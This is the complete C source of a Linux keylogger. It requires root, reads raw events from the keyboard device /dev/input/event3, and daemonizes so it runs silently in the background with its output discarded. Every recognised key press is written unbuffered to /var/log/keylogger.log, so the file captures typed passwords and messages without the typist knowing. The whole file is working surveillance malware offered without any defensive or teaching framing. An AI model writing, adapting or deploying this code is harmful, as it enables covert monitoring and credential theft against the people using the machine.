#include <stdio.h>
#include <fcntl.h>   // open
#include <stdlib.h>
#include <string.h>  // strerror
#include <errno.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>  // daemon, close
#include <linux/input.h>

#include "key_util.h"
#include "util.h"

typedef struct input_event input_event;

static void rootCheck();
static char *getKeyboardDeviceFileName();
static int openKeyboardDeviceFile();

/**
 * Exit with return code -1 if user does not have root privileges
 */
static void rootCheck() {
   if (geteuid() != 0) {
      printf("Must run as root\n");
      exit(-1);
   }
}

/**
 * Detects and returns the name of the keyboard device file
 *
 * @return the name of the keyboard device file
 */
static char *getKeyboardDeviceFileName() {
   return "/dev/input/event3";
}

/**
 * Opens the keyboard device file
 *
 * @return the file descriptor on success, error code on failure
 */
static int openKeyboardDeviceFile() {
   int kbd_fd = open(getKeyboardDeviceFileName(), O_RDONLY);
   if (kbd_fd == -1) {
      LOG_ERROR("%s", strerror(errno));
      exit(-1);
   }

   return kbd_fd;
}

int main() {
   rootCheck();

   int kbd_fd = openKeyboardDeviceFile();
   assert(kbd_fd > 0);

   FILE *logfile = fopen("/var/log/keylogger.log", "a");
   if (logfile == NULL) {
      LOG_ERROR("Could not open log file");
      exit(-1);
   }

   // We want to write to the file on every keypress, so disable buffering
   setbuf(logfile, NULL);

   // Daemonize process. Don't change working directory but redirect standard
   // inputs and outputs to /dev/null
   if (daemon(1, 0) == -1) {
      LOG_ERROR("%s", strerror(errno));
      exit(-1);
   }

   input_event event;
   while (read(kbd_fd, &event, sizeof(input_event)) > 0) {
      if (event.type == EV_KEY) {
         if (event.value == 1) { // Key press
            char *name = getKeyText(event.code);
            if (strcmp(name, UNKNOWN_KEY) != 0) {
               LOG("%s", name);
               fprintf(logfile, "%s", name);
            }
         }
      }
   }

   fclose(logfile);
   close(kbd_fd);
   return 0;
}
